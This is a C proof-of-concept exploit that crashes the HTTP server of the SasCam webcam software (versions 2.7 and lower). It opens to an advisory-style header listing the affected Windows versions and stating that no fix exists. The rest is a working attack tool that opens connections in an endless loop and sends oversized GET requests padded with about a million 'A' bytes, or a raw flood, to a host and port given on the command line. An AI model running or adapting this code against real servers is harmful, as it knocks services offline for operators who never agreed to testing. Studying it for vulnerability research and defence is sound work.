/*
   DISCLAIMER
  
   THIS PROGRAM IS NOT INTENDED TO BE USED ON OTHER COMPUTERS AND IT IS DESTINED FOR PERSONAL RESEARCH ONLY!!!!
   Also the free software programs provided by fl0 fl0w may be freely distributed and that the disclaimer below is always attached to it.
   The programs are provided as is without any guarantees or warranty.
   Although the author has attempted to find and correct any bugs in the free software programs, 
     the author is not responsible for any damage or losses of any kind caused by the use or misuse of the programs.
   The author is under no obligation to provide support, service, corrections, or upgrades to the free software programs.   
   
   Author:           fl0 fl0w
   Software:         SasCam  
   Dl link:          http://soft.saschart.com/sascam_webcam_server.php
   
   Afected Versions: 2.65,2.7 and lower 
   Remote:           Yes
   Local:            No
   Class:            Boundary Condition Error
   Bug:              HTTP server process termination
   Afected software: Windows 98 or higher{
                                          Windows 98
									  	  Windows ME
							              Windows NT 3.1/3.5/3.51/4.0
						   	              Windows 2000   
                                          Windows XP Service Pack 2/3 
                                          Windows Server 2003
                                          Windows Fundamentals for Legacy PCs
				  			              Windows Vista
                                          Windows Server 2008
                                          Windows Home Server
                                          Windows 7
                                          Windows Server 2008 R2 
                     }
 	
   Fix:              No fix    
   Compiler:         gcc version 3.4.4 (cygming special, gdc 0.12, using dmd 0.125)  
   Advice:           To avoid any problems under Windows use cygwin console.
  
   The .C code:
 */

#include<stdio.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<unistd.h>
     typedef int i32;
     typedef char i8;
     typedef short i16;
#define BUFFSZ 9999999                     
#define GET1 "GET /"
#define GET2 " HTTP/1.0\r\n" \
               "\r\n"
#define TITLE "-sasCam 2.6.5 remote http server crash poc\n" \
              "-by fl0 fl0w\n" 			   
        void copy_str(i8*,i8*,i32);
        void get_arguments(i32,i8**);
        void error_handle(void);
		void mset(i8*,i32,i32);
		void syntax();
    struct{
          i8* host;
          i16 port;  
		  i8  ping[BUFFSZ];
		  i32 sockets;
		  i32 receves;
		  i8  recvbytes[BUFFSZ];
		  i8  sendbytes[BUFFSZ];
		  i32 sizes;
		  i32 x;
		  i8* option;
    }use;
           int main(int argc,char** argv){
		    printf("%s",TITLE);
            get_arguments(argc,argv);
            struct sockaddr_in s;
            use.sizes=sizeof(s);     
            s.sin_family=AF_INET;
            s.sin_addr.s_addr=inet_addr(use.host);
            s.sin_port=htons(use.port);
               printf("[*]connection established\n");
			   printf("[*]Sending packets!\n");
		         for(;;){  
			             use.x++;
                         use.sockets = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
					     if (use.sockets < 0){
					     printf("line 81"); 
                         error_handle();
                        }			           
					    if (strcmp(use.option, "get") == 0){		
						   copy_str(use.sendbytes, GET1, 5);
						   mset(use.sendbytes+5,0x41,999999);
						   copy_str(use.sendbytes+5+999999, GET2, 17);
                        }else{
							  if(strcmp(use.option,"flood")==0){
							    mset(use.sendbytes+5,0x41,999999);
							  }
						}
                       if(connect(use.sockets,(struct sockaddr*)&s,use.sizes)<0){
					     printf("Nr of connections:%d\nline 89:",use.x);
			             error_handle();
					   }else{
							 printf(".");
					    }	 
			          
                       if(send(use.sockets,use.sendbytes,sizeof(use.sendbytes),0)<0){
					     printf("Nr of sends:\nline 96:",use.x);
                         error_handle();
                         shutdown(use.sockets,1);
                       }else{
							 memset(use.recvbytes,0,BUFFSZ);
							 recv(use.sockets,use.recvbytes,BUFFSZ,0);
					    }
                     
			    }
          		 printf("[*]Done!\n");
       return 0;
      }
        void copy_str(i8* v,i8* w,i32 len){
                   memcpy(v,w,len);
        }
		void mset(i8* x,i32 y,i32 len){
		       memset(x,y,len);
	    }
    void get_arguments(i32 argc,i8** argv){
              if(argc<6){
			             syntax();
					     exit(0);		
			  }else{ 
                     i32 i;
                     argc--;
                     for(i=1;i<argc;i++){
                         switch(argv[i][1]){
                               case'h':
                                       use.host=argv[++i];
                               break;
                               case'p':
                                       use.port=atoi(argv[++i]);
                               break;             
							   case'o':
								       use.option=argv[++i];
							   break;		   
                               default:{
                                       printf("error with argument nr %d:(%s)\n",i,argv[i]);
									   exit(0); 
                               }      
                         }                
                     }
              }
    }
		   
		   void syntax(){
             i8 *help[]={"\torder of arguments: -h,-p,-o",
			             "\t-h hostname",
                         "\t-p port(default 8080)",
						 "\t-o option(get/flood)"
                };
                i32 i;
                size_t com=sizeof help / sizeof help[0];
                for(i=0;i<com;i++){
                   printf("%s\n",help[i]); 
               }
		  }
		  
          void error_handle(void){
                   perror("\nError");
                   exit(1);
		  }     
		  
		  